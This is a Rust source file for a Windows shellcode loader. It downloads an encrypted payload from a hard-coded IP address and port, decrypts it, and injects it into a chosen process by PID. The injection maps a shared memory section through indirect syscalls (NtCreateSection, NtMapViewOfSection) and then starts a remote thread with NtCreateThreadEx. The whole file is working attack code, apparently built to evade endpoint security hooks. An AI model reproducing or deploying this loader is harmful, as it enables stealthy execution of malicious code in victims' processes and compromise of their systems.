use std::ffi::c_void;
use std::io::Error;
use std::ptr::null_mut;
use std::process::exit;

use winapi::shared::ntdef::LARGE_INTEGER;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess};
use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS, SEC_COMMIT};

use crate::crypt::decrypt_shellcode;
use crate::download::get_contents;
use crate::sleep::fake_sleep;

// Importa os stubs do .asm (agora como funções diretas)
use crate::indirect_syscalls::{
    NtCreateSection, NtMapViewOfSection, NtCreateThreadEx
};
use crate::indirect_syscalls::resolver::init_indirect_syscalls;

pub async fn run_indirect_loader(pid: u32) -> Result<(), Box<dyn std::error::Error>> {
    //fake_sleep(10);
    println!("ue");
    let encrypted_shellcode = get_contents("http://192.168.119.128:8443/content.b64").await?;
    let mut shellcode = decrypt_shellcode(&encrypted_shellcode)?;
    println!("[i] step 0");

    unsafe {
        init_indirect_syscalls();
        println!("[i] step 1");

        let mut section_handle: HANDLE = null_mut();
        let mut section_size: LARGE_INTEGER = std::mem::zeroed();
        *section_size.QuadPart_mut() = shellcode.len() as i64;

        let desired_access = winapi::um::winnt::SECTION_MAP_READ
            | winapi::um::winnt::SECTION_MAP_WRITE
            | winapi::um::winnt::SECTION_MAP_EXECUTE;

        let status = NtCreateSection(
            &mut section_handle,
            desired_access,
            null_mut(),
            &mut section_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );

        println!("status: {:#X}", status);
        if status < 0 {
            eprintln!("[-] NtCreateSection failed: {:#X}", status);
            exit(1);
        }

        println!("[i] step 3");

        let mut local_section_address: *mut c_void = null_mut();
        let mut view_size = shellcode.len();
        println!("[i] step 4");

        let status = NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut local_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_READWRITE,
        );

        if status < 0 {
            eprintln!("[-] NtMapViewOfSection (local) failed: {:#X}", status);
            exit(1);
        }

        println!("[i] step 5");

        let target_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if target_handle.is_null() {
            eprintln!("[-] OpenProcess failed: {:?}", Error::last_os_error());
            exit(1);
        }

        println!("[i] step 6");

        let mut remote_section_address: *mut c_void = null_mut();
        let status = NtMapViewOfSection(
            section_handle,
            target_handle,
            &mut remote_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2,
            0,
            PAGE_EXECUTE_READ,
        );

        if status < 0 {
            eprintln!("[-] NtMapViewOfSection (remote) failed: {:#X}", status);
            CloseHandle(target_handle);
            exit(1);
        }

        println!("[i] step 7");

        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_section_address as *mut u8,
            shellcode.len(),
        );

        let mut remote_thread: HANDLE = null_mut();
        let status = NtCreateThreadEx(
            &mut remote_thread,
            0x1FFFFF,
            null_mut(),
            target_handle,
            remote_section_address,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        println!("[i] step 8");

        if status < 0 {
            eprintln!("[-] NtCreateThreadEx failed: {:#X}", status);
        }

        CloseHandle(target_handle);
        if !remote_thread.is_null() {
            CloseHandle(remote_thread);
        }
    }

    Ok(())
}
